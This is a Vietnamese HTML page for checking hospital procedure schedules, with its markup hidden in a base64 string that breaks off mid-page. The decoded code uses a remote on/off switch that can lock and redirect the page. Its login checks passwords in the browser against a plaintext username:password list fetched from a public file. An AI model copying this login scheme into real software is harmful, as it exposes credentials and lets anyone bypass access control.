<!-- 

///////////////////////////////////////////////
/////Code được viết bởi Chauhuynh0104/////////
////http://fb.com/chauhuynh0104//////////////
/////////////079.567.9350///////////////////
///Vui lòng tôn trọng bản quyền tác giả////
/////////Không xoá dòng này //////////////
/////////////////////////////////////////

!-->
<!DOCTYPE html>
<html lang="vi">
<head><meta charset="UTF-8"><title>Thủ Thuật</title></head>
<body>
<script>
  const base64 = "PCEtLSANCi8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8NCi8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLw0KLy8vLy8vLy8vLy8vLy9Db2RlIMSRxrDhu6NjIHZp4bq/dCBi4bufaSBDaGF1aHV5bmgwMTA0Ly8vLy8vLy8vLy8vLy8vLw0KLy8vLy8vLy8vLy8vL2h0dHA6Ly9mYi5jb20vY2hhdWh1eW5oMDEwNC8vLy8vLy8vLy8vLy8vLy8vLy8vLw0KLy8vLy8vLy8vLy8vLy8vLy8vLy8vLzA3OS41NjcuOTM1MC8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vDQovLy8vLy8vLy8vLy9WdWkgbMOybmcgdMO0biB0cuG7jW5nIGLhuqNuIHF1eeG7gW4gdMOhYyBnaeG6oy8vLy8vLy8vLy8vDQovLy8vLy8vLy8vLy8vLy8vLy9LaMO0bmcgeG/DoSBkw7JuZyBuw6B5IC8vLy8vLy8vLy8vLy8vLy8vLy8vLw0KLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vDQovLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLw0KIS0tPg0KPCFET0NUWVBFIGh0bWw+DQoNCjxodG1sIGxhbmc9InZpIj4NCjxoZWFkPg0KPGxpbmsgaHJlZj0iaHR0cHM6Ly9mb250cy5nb29nbGVhcGlzLmNvbS9jc3MyP2ZhbWlseT1JbnRlcjp3Z2h0QDQwMDs2MDA7NzAwJmFtcDtkaXNwbGF5PXN3YXAiIHJlbD0ic3R5bGVzaGVldCIvPg0KPGxpbmsgaHJlZj0iaHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvZm9udC1hd2Vzb21lLzYuNC4wL2Nzcy9hbGwubWluLmNzcyIgcmVsPSJzdHlsZXNoZWV0Ii8+DQo8bWV0YSBjaGFyc2V0PSJ1dGYtOCIvPg0KPG1ldGEgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCIgbmFtZT0idmlld3BvcnQiLz4NCjx0aXRsZT5LaeG7g20gVHJhIFRo4bunIFRodeG6rXQ8L3RpdGxlPg0KPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2NoYXVodXluaDAxMDQuZ2l0aHViLmlvL2d5bS9naWFvZGllbi5jc3MiPg0KPHNjcmlwdD4NCiAgICBhc3luYyBmdW5jdGlvbiBjaGVja0FjY2VzcygpIHsNCiAgICAgICAgY29uc3QganNvblVybCA9ICdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vY2hhdWh1eW5oMDEwNC9jaGF1aHV5bmgwMTA0LnR4dC9yZWZzL2hlYWRzL21haW4vZHJjaGF1Lmpzb24nOw0KICAgICAgICB0cnkgew0KICAgICAgICAgICAgY29uc3QgcmVzID0gYXdhaXQgZmV0Y2goanNvblVybCk7DQogICAgICAgICAgICBpZiAoIXJlcy5vaykgdGhyb3cgbmV3IEVycm9yKCdLaMO0bmcgdGjhu4MgdOG6o2kgZmlsZSBKU09OJyk7DQogICAgICAgICAgICBjb25zdCBjb25maWcgPSBhd2FpdCByZXMuanNvbigpOw0KDQogICAgICAgICAgICBpZiAoIWNvbmZpZy5BQ0NFU1NfQUxMT1dFRCkgew0KICAgICAgICAgICAgICAgIGRvY3VtZW50LmJvZHkuaW5uZXJIVE1MID0gYDxkaXYgc3R5bGU9InBhZGRpbmc6NTBweDt0ZXh0LWFsaWduOmNlbnRlcjtjb2xvcjpyZWQ7Zm9udC1zaXplOjIwcHgiPg0KICAgICAgICAgICAgICAgICAgICA8aDI+QuG6ok8gVFLDjCBI4buGIFRI4buQTkc8L2gyPg0KICAgICAgICAgICAgICAgICAgICA8cD4ke2NvbmZpZy5NRVNTQUdFfTwvcD4NCiAgICAgICAgICAgICAgICAgICAgJHtjb25maWcuUkVESVJFQ1RfVVJMID8gYDxwPlPhur0gY2h1eeG7g24gaMaw4bubbmcgc2F1IDxzcGFuIGlkPSdjb3VudGRvd24nPjU8L3NwYW4+IGdpw6J5Li4uPC9wPmAgOiAnJ30NCiAgICAgICAgICAgICAgICA8L2Rpdj5gOw0KICAgICAgICAgICAgICAgIGlmIChjb25maWcuUkVESVJFQ1RfVVJMKSB7DQogICAgICAgICAgICAgICAgICAgIGxldCBzZWNvbmRzID0gNTsNCiAgICAgICAgICAgICAgICAgICAgY29uc3QgdGltZXIgPSBzZXRJbnRlcnZhbCgoKSA9PiB7DQogICAgICAgICAgICAgICAgICAgICAgICBzZWNvbmRzLS07DQogICAgICAgICAgICAgICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnY291bnRkb3duJykuaW5uZXJUZXh0ID0gc2Vjb25kczsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChzZWNvbmRzIDw9IDApIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGVhckludGVydmFsKHRpbWVyKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aW5kb3cubG9jYXRpb24uaHJlZiA9IGNvbmZpZy5SRURJUkVDVF9VUkw7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIH0sIDEwMDApOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICB9DQogICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgfSBjYXRjaCAoZXJyKSB7DQogICAgICAgICAgICBkb2N1bWVudC5ib2R5LmlubmVySFRNTCA9IGA8ZGl2IHN0eWxlPSdwYWRkaW5nOjUwcHg7dGV4dC1hbGlnbjpjZW50ZXI7Y29sb3I6cmVkJz4NCiAgICAgICAgICAgICAgICA8aDI+S0jDlE5HIFThuqJJIMSQxq/hu6JDIEPhuqRVIEjDjE5IPC9oMj48cD5M4buXaSB0cnV5IGPhuq1wIGtoaSBr4bq/dCBu4buRaSBt4bqhbmcuPGJyLz4gVnVpIGzDsm5nIGtp4buDbSB0cmEgbOG6oWkgxJHGsOG7nW5nIHRydXnhu4FuIGludGVybmV0LjwvcD4NCiAgICAgICAgICAgIDwvZGl2PmA7DQogICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgIH0NCiAgICB9DQoNCiAgICBhc3luYyBmdW5jdGlvbiBsb2FkQWNjb3VudHNGcm9tVFhUKCkgew0KICAgICAgICBjb25zdCB0eHRVcmwgPSAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoYXVodXluaDAxMDQvY2hhdWh1eW5oMDEwNC50eHQvcmVmcy9oZWFkcy9tYWluL3Rray50eHQnOw0KICAgICAgICBjb25zdCByZXMgPSBhd2FpdCBmZXRjaCh0eHRVcmwpOw0KICAgICAgICBjb25zdCB0ZXh0ID0gYXdhaXQgcmVzLnRleHQoKTsNCiAgICAgICAgY29uc3QgYWNjb3VudHMgPSB7fTsNCiAgICAgICAgdGV4dC5zcGxpdCgnXG4nKS5mb3JFYWNoKGxpbmUgPT4gew0KICAgICAgICAgICAgY29uc3QgW3UsIHBdID0gbGluZS50cmltKCkuc3BsaXQoJzonKTsNCiAgICAgICAgICAgIGlmICh1ICYmIHApIGFjY291bnRzW3VdID0gcDsNCiAgICAgICAgfSk7DQogICAgICAgIHJldHVybiBhY2NvdW50czsNCiAgICB9DQoNCiAgICBhc3luYyBmdW5jdGlvbiBlbmFibGVMb2dpbihhY2NvdW50cykgew0KICAgICAgICBjb25zdCBidG4gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9naW5CdG4nKTsNCiAgICAgICAgY29uc3QgdXNlcklucHV0ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3VzZXJuYW1lSW5wdXQnKTsNCiAgICAgICAgY29uc3QgcGFzc0lucHV0ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Bhc3N3b3JkSW5wdXQnKTsNCiAgICAgICAgY29uc3QgZXJyb3JEaXYgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9naW5FcnJvcicpOw0KDQogICAgICAgIGJ0bi5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsICgpID0+IHsNCiAgICAgICAgICAgIGNvbnN0IHVzZXIgPSB1c2VySW5wdXQudmFsdWUudHJpbSgpOw0KICAgICAgICAgICAgY29uc3QgcGFzcyA9IHBhc3NJbnB1dC52YWx1ZS50cmltKCk7DQogICAgICAgICAgICBpZiAoYWNjb3VudHNbdXNlcl0gJiYgYWNjb3VudHNbdXNlcl0gPT09IHBhc3MpIHsNCiAgICAgICAgICAgICAgICBzZXNzaW9uU3RvcmFnZS5zZXRJdGVtKCdtZWRVc2VyJywgdXNlcik7DQogICAgICAgICAgICAgICAgZG9jdW1lbnQuYm9keS5jbGFzc0xpc3QucmVtb3ZlKCdsb2dpbi1wYWdlJyk7DQogICAgICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvZ2luU2VjdGlvbicpLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogICAgICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ21haW5Db250ZW50Jykuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQogICAgICAgICAgICAgICAgZXJyb3JEaXYuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgZXJyb3JEaXYuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQogICAgICAgICAgICB9DQogICAgICAgIH0pOw0KICAgIH0NCmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoJ0RPTUNvbnRlbnRMb2FkZWQnLCBmdW5jdGlvbigpIHsNCmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzaG93TW9yZVN1Z2dlc3Rpb25zQ2hlY2tib3gnKS5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCBmdW5jdGlvbigpIHsNCiAgICBpZiAoYWxsUHJvY2VkdXJlcy5sZW5ndGggPiAwKSB7DQogICAgICAgIGdlbmVyYXRlVGltZVN1Z2dlc3Rpb25zKGFsbFByb2NlZHVyZXMpOw0KICAgICAgICBmaWx0ZXJCeU9wZXJhdG9yKCk7DQogICAgfQ0KfSk7DQp9KTsNCg0KIHdpbmRvdy5hZGRFdmVudExpc3RlbmVyKCdET01Db250ZW50TG9hZGVkJywgYXN5bmMgKCkgPT4gew0KICBjb25zdCBhbGxvdyA9IGF3YWl0IGNoZWNrQWNjZXNzKCk7DQogIGlmICghYWxsb3cpIHJldHVybjsNCiAgLy8gQ2jhu4kga2nhu4NtIHRyYSDEkcSDbmcgbmjhuq1wIMSRw6MgbMawdTsgS0jDlE5HIHThuqNpIHJ1bGUvcHJvY2VkdXJlcyDhu58gxJHDonkNCiAgY2hlY2tTYXZlZExvZ2luKCk7DQp9KTsNCg0KPC9zY3JpcHQ+DQoNCg0KDQoNCjwvaGVhZD4NCjxib2R5Pg0KPCEtLSBUSEVNRSBQSUNLRVIgLS0+DQo8ZGl2IGlkPSJ0aGVtZVBpY2tlciIgY2xhc3M9InRoZW1lLXBpY2tlciIgdGl0bGU9IkNo4buNbiBtw6B1IGNo4bunIMSR4buBIGdpYW8gZGnhu4duIj4NCiANCiANCiAgPGJ1dHRvbiB0eXBlPSJidXR0b24iIGNsYXNzPSJ0aGVtZS1zd2F0Y2giIGRhdGEtdGhlbWU9ImRlZmF1bHQiIHN0eWxlPSItLXN3YXRjaDojMzQ5OGRiIiBhcmlhLWxhYmVsPSJN4bq3YyDEkeG7i25oIChYYW5oIGTGsMahbmcpIj48L2J1dHRvbj4NCiAgPGJ1dHRvbiB0eXBlPSJidXR0b24iIGNsYXNzPSJ0aGVtZS1zd2F0Y2giIGRhdGEtdGhlbWU9Im9yYW5nZSIgIHN0eWxlPSItLXN3YXRjaDojRkY2NjAwIiBhcmlhLWxhYmVsPSJNw6B1IGNhbSI+PC9idXR0b24+DQogIDxidXR0b24gdHlwZT0iYnV0dG9uIiBjbGFzcz0idGhlbWUtc3dhdGNoIiBkYXRhLXRoZW1lPSJyZWQiICAgICBzdHlsZT0iLS1zd2F0Y2g6I0ZGMDAwMCIgYXJpYS1sYWJlbD0iTcOgdSDEkeG7jyI+PC9idXR0b24+DQogIDxidXR0b24gdHlwZT0iYnV0dG9uIiBjbGFzcz0idGhlbWUtc3dhdGNoIiBkYXRhLXRoZW1lPSJncmVlbiIgICBzdHlsZT0iLS1zd2F0Y2g6IzAwQUEwMCIgYXJpYS1sYWJlbD0iTcOgdSB4YW5oIGzDoSI+PC9idXR0b24+DQogICA8YnV0dG9uIHR5cGU9ImJ1dHRvbiIgaWQ9ImRhcmtUb2dnbGUiIGNsYXNzPSJ0aGVtZS1kYXJrLXRvZ2dsZSIgb25jbGljaz0idG9nZ2xlRGFya01vZGUoKSIgYXJpYS1sYWJlbD0iQuG6rXQvVOG6r3QgY2jhur8gxJHhu5kgdOG7kWkiPg0KICAgIDxzcGFuIGlkPSJkYXJrSWNvbiI+PHNtYWxsPvCfjJk8L3NtYWxsPjwvc3Bhbj4gPHNwYW4gaWQ9ImRhcmtUZXh0Ij5U4buRaTwvc3Bhbj4NCiAgPC9idXR0b24+DQogIA0KPC9kaXY+DQoNCg0KDQoNCjxzY3JpcHQ+DQogICAgICBmdW5jdGlvbiB0b2dnbGVEYXJrTW9kZSgpIHsNCiAgICAgICAgY29uc3QgYm9keSA9IGRvY3VtZW50LmJvZHk7DQogICAgICAgIGNvbnN0IGljb24gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZGFya0ljb24iKTsNCiAgICAgICAgY29uc3QgdGV4dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJkYXJrVGV4dCIpOw0KICAgICAgICBib2R5LmNsYXNzTGlzdC50b2dnbGUoImRhcmstbW9kZSIpOw0KICAgICAgICBjb25zdCBpc0RhcmsgPSBib2R5LmNsYXNzTGlzdC5jb250YWlucygiZGFyay1tb2RlIik7DQogICAgICAgIGljb24udGV4dENvbnRlbnQgPSBpc0RhcmsgPyAi4piA77iPIiA6ICLwn4yZIjsNCiAgICAgICAgdGV4dC50ZXh0Q29udGVudCA9IGlzRGFyayA/ICJTw6FuZyIgOiAiVOG7kWkiOw0KICAgICAgfQ0KICAgIDwvc2NyaXB0Pg0KPHNjcmlwdD4NCmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoJ0RPTUNvbnRlbnRMb2FkZWQnLCAoKSA9PiB7DQovLyBM4bqleSBjw6FjIHBo4bqnbiB04butDQogICAgICAgICAgICBjb25zdCB0cmlnZ2VyQnV0dG9uID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3RyaWdnZXJCdXR0b24nKTsNCiAgICAgICAgICAgIGNvbnN0IGZpbGVJbnB1dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmaWxlSW5wdXQnKTsNCg0KICAgICAgICAgICAgLy8gS2nhu4NtIHRyYSB4ZW0gcGjhuqduIHThu60gY8OzIHThu5NuIHThuqFpIGtow7RuZw0KICAgICAgICAgICAgaWYgKCF0cmlnZ2VyQnV0dG9uIHx8ICFmaWxlSW5wdXQpIHsNCiAgICAgICAgICAgICAgICBjb25zb2xlLmVycm9yKCdM4buXaTogS2jDtG5nIHTDrG0gdGjhuqV5IHRyaWdnZXJCdXR0b24gaG/hurdjIGZpbGVJbnB1dCcpOw0KICAgICAgICAgICAgICAgIHJldHVybjsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgLy8gVGjDqm0gc+G7sSBraeG7h24gY2xpY2sgY2hvIGJ1dHRvbg0KICAgICAgICAgICAgdHJpZ2dlckJ1dHRvbi5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsICgpID0+IHsNCiAgICAgICAgICAgICAgICBmaWxlSW5wdXQuY2xpY2soKTsgLy8gS8OtY2ggaG/huqF0IGlucHV0IGZpbGUNCiAgICAgICAgICAgIH0pOw0KDQogICAgICAgIH0pOw0KDQo8L3NjcmlwdD4NCg0KPGRpdiBjbGFzcz0iY29udGFpbmVyIj4NCjxkaXYgY2xhc3M9ImxvZ2luLXNlY3Rpb24iIGlkPSJsb2dpblNlY3Rpb24iPg0KPGgyIGNsYXNzPSJsb2dpbi10aXRsZSI+xJDEgk5HIE5I4bqsUCBI4buGIFRI4buQTkc8L2gyPg0KPGlucHV0IGNsYXNzPSJsb2dpbi1pbnB1dCIgaWQ9InVzZXJuYW1lSW5wdXQiIHBsYWNlaG9sZGVyPSJUw6puIMSRxINuZyBuaOG6rXAiIHR5cGU9InRleHQiLz4NCjxpbnB1dCBjbGFzcz0ibG9naW4taW5wdXQiIGlkPSJwYXNzd29yZElucHV0IiBwbGFjZWhvbGRlcj0iTeG6rXQga2jhuql1IiB0eXBlPSJwYXNzd29yZCIvPg0KPGJyLz48YnV0dG9uIGNsYXNzPSJidG4iIGlkPSJsb2dpbkJ0biI+xJDEg25nIG5o4bqtcDwvYnV0dG9uPg0KPGRpdiBjbGFzcz0ibG9naW4tZXJyb3IiIGlkPSJsb2dpbkVycm9yIj5Uw6puIMSRxINuZyBuaOG6rXAgaG/hurdjIG3huq10IGto4bqpdSBraMO0bmcgxJHDum5nPC9kaXY+DQo8L2Rpdj4NCjxkaXYgY2xhc3M9Im1haW4tY29udGVudCIgaWQ9Im1haW5Db250ZW50Ij4NCjxkaXYgY2xhc3M9InRvcC1idXR0b24tZ3JvdXAiPiA8YnV0dG9uIG9uY2xpY2s9Im9wZW5Qcm9jZWR1cmVTY2hlZHVsZXIoKSJjbGFzcz0iYnRuIj5U4bqhbyBnaeG7nSB0aOG7pyB0aHXhuq10PC9idXR0b24+DQogIDxidXR0b24gb25jbGljaz0ib3BlbkN1c3RvbWl6ZVBhbmVsKCkiIGNsYXNzPSJidG4iPlR14buzIGJp4bq/bjwvYnV0dG9uPg0KDQoNCg0KPGJ1dHRvbiBvbmNsaWNrPSJzaG93RHJvcGJveFBhbmVsKCkiIGNsYXNzPSJidG4iPlBhbmVsPC9idXR0b24+DQoNCiAgPGJ1dHRvbiBvbmNsaWNrPSJ3aW5kb3cubG9jYXRpb24ucmVsb2FkKCk7IiBjbGFzcz0iYnRuIj5Yb8OhIENhY2hlPC9idXR0b24+DQogIDxidXR0b24gY2xhc3M9ImJ0biJpZD0ibG9nb3V0QnRuIj7EkMSDbmcgeHXhuqV0PC9idXR0b24+DQo8L2Rpdj4NCg0KDQo8aDE+IDxhIGhyZWY9Imh0dHBzOi8vZmIuY29tL2NoYXVodXluaDAxMDQiIHN0eWxlPSJhbGw6IHVuc2V0OyBjdXJzb3I6IHBvaW50ZXI7IiB0YXJnZXQ9Il9ibGFuayI+S2nhu4NtIFRyYSBUaOG7pyBUaHXhuq10PC9hPjwvaDE+DQo8ZGl2IGNsYXNzPSJsaXN0MSIgc3R5bGU9ImRpc3BsYXk6IGZsZXg7IGFsaWduLWl0ZW1zOiBjZW50ZXI7IGdhcDogOHB4OyI+DQo8aSBjbGFzcz0iZmEgZmEtYnVsbGhvcm4iPjwvaT4NCjxiPjxmb250IGNvbG9yPSJyZWQiPlRow7RuZyBiw6FvOjwvZm9udD48L2I+DQo8ZGl2IGNsYXNzPSJzY3JvbGxpbmctdGV4dCIgc3R5bGU9ImZsZXg6IDE7IG92ZXJmbG93OiBoaWRkZW47Ij4NCjxkaXYgY2xhc3M9InNjcm9sbGluZy1jb250ZW50IiBpZD0ibm9pZHVuZyI+DQoNCjwvZGl2Pg0KPC9kaXY+DQo8L2Rpdj4NCjxzY3JpcHQ+DQoNCg0KZmV0Y2goJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9jaGF1aHV5bmgwMTA0L2NoYXVodXluaDAxMDQudHh0L3JlZnMvaGVhZHMvbWFpbi90aG9uZ2Jhby50eHQnKQ0KICAudGhlbihyZXNwb25zZSA9PiByZXNwb25zZS50ZXh0KCkpDQogIC50aGVuKGRhdGEgPT4gew0KICAgIGNvbnN0IGVsID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ25vaWR1bmcnKTsNCiAgICBlbC5pbm5lckhUTUwgPSBkYXRhOw0KDQogICAgLy8gVMSDbmcgxJHhu5kgZMOgaSBu4buZaSBkdW5nIMSR4buDIMSR4bqjbSBi4bqjbyBjdeG7mW4NCiAgICBlbC5zdHlsZS5kaXNwbGF5ID0gJ2lubGluZS1ibG9jayc7DQogICAgZWwuc3R5bGUubWluV2lkdGggPSAnMTAwJSc7DQoNCiAgICAvLyBSZXNldCBhbmltYXRpb24gdG8gZm9yY2UgcmVmbG93DQogICAgZWwuc3R5bGUuYW5pbWF0aW9uID0gJ25vbmUnOw0KICAgIHZvaWQgZWwub2Zmc2V0V2lkdGg7DQogICAgZWwuc3R5bGUuYW5pbWF0aW9uID0gJ3Njcm9sbC1sZWZ0IDEwcyBsaW5lYXIgaW5maW5pdGUnOw0KICB9KQ0KICAuY2F0Y2goZXJyb3IgPT4gew0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdub2lkdW5nJykudGV4dENvbnRlbnQgPSAnS2jDtG5nIHRo4buDIHThuqNpIG7hu5lpIGR1bmcuJzsNCiAgICBjb25zb2xlLmVycm9yKGVycm9yKTsNCiAgfSk7DQoNCg0KPC9zY3JpcHQ+DQo8ZGl2IGNsYXNzPSJ1cGxvYWQtc2VjdGlvbiI+PGRpdiBjbGFzcz0ibWFpbmJsb2siPg0KDQo8aW5wdXQgYWNjZXB0PSIueGxzeCwgLnhscywgLmNzdiIgaWQ9ImZpbGVJbnB1dCIgc3R5bGU9ImRpc3BsYXk6bm9uZSIgdHlwZT0iZmlsZSIvPg0KPGJ1dHRvbiBjbGFzcz0iYnRuIiBpZD0idHJpZ2dlckJ1dHRvbiI+PGkgY2xhc3M9ImZhcyBmYS1maWxlLXVwbG9hZCI+PC9pPiBDaOG7jW4gZmlsZSB0aOG7pyBjw7RuZzwvYnV0dG9uPg0KPGJyLz48YnIvPg0KPGlucHV0IGRpcmVjdG9yeT0iIiBpZD0iZm9sZGVySW5wdXQiIG11bHRpcGxlPSIiIHN0eWxlPSJkaXNwbGF5Om5vbmUiIHR5cGU9ImZpbGUiIHdlYmtpdGRpcmVjdG9yeT0iIi8+DQo8YnV0dG9uIGNsYXNzPSJidG4iIGlkPSJmb2xkZXJCdG4iPjxpIGNsYXNzPSJmYXMgZmEtZm9sZGVyLW9wZW4iPjwvaT4gQ2jhu41uIHRoxrAgbeG7pWMgKFThu7EgxJHhu5luZyB0w6xtIGZpbGUpPC9idXR0b24+DQo8ZGl2IGlkPSJzY2FuU3RhdHVzIiBzdHlsZT0ibWFyZ2luLXRvcDoxMHB4O2NvbG9yOiMzNDk4ZGI7Zm9udC13ZWlnaHQ6Ym9sZCI+PC9kaXY+DQoNCg0KPGxhYmVsPg0KPGlucHV0IG5hbWU9InRpbWVPcHRpb24iIHR5cGU9InJhZGlvIiB2YWx1ZT0iNzowMCIvPiANCiAgICAgICAgICAgICAgICAgICAgICAgIEfhu6NpIMO9IHThu6sgMDc6MDANCiAgICAgICAgICAgICAgICAgICAgPC9sYWJlbD4NCjxsYWJlbD4NCjxpbnB1dCBjaGVja2VkPSIiIG5hbWU9InRpbWVPcHRpb24iIHR5cGU9InJhZGlvIiB2YWx1ZT0iNzozMCIvPiANCiAgICAgICAgICAgICAgICAgICAgICAgIEfhu6NpIMO9IHThu6sgMDc6MzANCiAgICAgICAgICAgICAgICAgICAgPC9sYWJlbD4NCjxici8+PGJyLz4NCg0KICA8bGFiZWwgc3R5bGU9Im1hcmdpbi1yaWdodDogMTBweDsiPg0KPGlucHV0IGNoZWNrZWQ9IjEiIGlkPSJpZ25vcmVBZGphY2VudENoZWNrYm94IiB0eXBlPSJjaGVja2JveCIvPg0KPHNwYW4gY2xhc3M9ImNodS10aGljaCI+QuG7jyBxdWEgdGjhu6cgdGh14bqtdCBsaeG7gW4ga+G7gTxzcGFuIGNsYXNzPSJub2ktZHVuZyI+VkQ6IDhoMDAtOGgzMCB4b2EgYsOzcC4gMDhoMzAtMDhoNTAgxJFp4buHbiBjaMOibS4gbGnDqm4gdGnhur9wIG3DoCBrbyBjw6FjaCAxIHBow7p0IDwvc3Bhbj48L3NwYW4+DQo8L2xhYmVsPg0KDQogIDxsYWJlbCBzdHlsZT0ibWFyZ2luLXJpZ2h0OiAxMHB4OyI+DQo8aW5wdXQgaWQ9InNob3dNb3JlU3VnZ2VzdGlvbnNDaGVja2JveCIgdHlwZT0iY2hlY2tib3giLz4gDQogICAgICAgIEhp4buDbiB0aOG7iyA2IGtodW5nIGdp4budIGfhu6NpIMO9ICAgICAgICAgDQogICAgPC9sYWJlbD4NCg0KPGxhYmVsIHN0eWxlPSJtYXJnaW4tcmlnaHQ6IDEwcHg7Ij4NCjxpbnB1dCBpZD0ic2hvd0RvY3RvckNoZWNrYm94IiB0eXBlPSJjaGVja2JveCIvPiANCiAgICAgICAgSGnhu4NuIHRo4buLIELDoWMgc8SpIGNo4buJIMSR4buLbmgNCiAgICA8L2xhYmVsPjxsYWJlbD4NCiAgPGlucHV0IGlkPSJzaG93SGVyYkVycm9yRGF5c0NoZWNrYm94IiB0eXBlPSJjaGVja2JveCJjaGVja2VkLz4NCiAgQ2jhu4kgaGnhu4NuIHRo4buLIG5nw6B5IHPhuq9jIHRodeG7kWMgbOG7l2kNCjwvbGFiZWw+DQo8YnIvPjxici8+DQo8YnV0dG9uIGNsYXNzPSJidG4iIGlkPSJhbmFseXplQnRuIj5LaeG7g20gVHJhPC9idXR0b24+DQoNCg0KDQoNCg0KDQoNCg0KDQo8c2NyaXB0Pg0KZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ZpbGVJbnB1dCcpLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIGZ1bmN0aW9uICgpIHsNCiAgICBjb25zdCBmaWxlID0gdGhpcy5maWxlc1swXTsNCiAgICBpZiAoZmlsZSkgew0KICAgICAgICBjb25zdCBzdGF0dXMgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2NhblN0YXR1cycpOw0KICAgICAgICBzdGF0dXMuaW5uZXJIVE1MID0gYDxpIGNsYXNzPSJmYXMgZmEtZmlsZSI+PC9pPsSQw6MgY2jhu41uIGZpbGU6IDxiPiR7ZmlsZS5uYW1lfTwvYj5gOw0KICAgICAgICBzdGF0dXMuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQogICAgICAgIHN0YXR1cy5zdHlsZS5jb2xvciA9ICcjMmMzZTUwJzsNCiAgICB9DQp9KTsNCg0KPC9zY3JpcHQ+DQo8ZGl2IGlkPSJzY2FuU3RhdHVzIiBzdHlsZT0ibWFyZ2luLXRvcDoxMHB4OyBjb2xvcjojMmMzZTUwOyBmb250LXdlaWdodDpib2xkOyBkaXNwbGF5OiBub25lOyI+PC9kaXY+DQo8YnIvPg0KPHNwYW4gc3R5bGU9ImZvbnQtc2l6ZTogMTJweDsiPjxpPlBo4bqnbiBt4buBbSDEkcO0aSBraGkgY8OzIHRo4buDIG3huq9jIGzhu5dpLiBYaW4gaMOjeSBraeG7g20gdHJhIGPDoWMgdGjDtG5nIHRpbiBxdWFuIHRy4buNbmcuPC9pPjwvc3Bhbj4NCjxkaXYgaWQ9ImZpbGVSZXF1aXJlbWVudHMiPjwvZGl2Pg0KPC9kaXY+PC9kaXY+DQoNCg0KPCEtLSBC4bquVCDEkOG6plU6IELhuqJORyBHSeG7nCBUUuG7kE5HIFThu6pORyBOR8av4bucSSAtLT4NCiAgPGJ1dHRvbiBpZD0iaGVyYlRvZ2dsZUJ0biIgY2xhc3M9ImJ0biIgb25jbGljaz0idG9nZ2xlSGVyYkxpc3QoKSJzdHlsZT0iZGlzcGxheTpub25lIj5T4bqvYyB0aHXhu5FjIHRoYW5nPC9idXR0b24+DQogIDxidXR0b24gY2xhc3M9ImJ0biIgb25jbGljaz0idG9nZ2xlQXZhaWxhYmlsaXR5KCkiIHN0eWxlPSJkaXNwbGF5Om5vbmUiPkdp4budIHRy4buRbmc8L2J1dHRvbj4NCjxidXR0b24gY2xhc3M9ImJ0biIgaWQ9ImVycm9yU3VtbWFyeUJ0biIgb25jbGljaz0ib3BlbkVycm9yU3VtbWFyeSgpIiBzdHlsZT0iZGlzcGxheTpub25lIj4NCiAgVMOzbSBU4bqvdCBM4buXaQ0KPC9idXR0b24+DQo8ZGl2IGlkPSJhdmFpbGFiaWxpdHlUYWJsZSIgc3R5bGU9ImRpc3BsYXk6IG5vbmU7IG1hcmdpbi1ib3R0b206IDIwcHg7Ij4NCiA8ZGl2IGNsYXNzPSJtYWluYm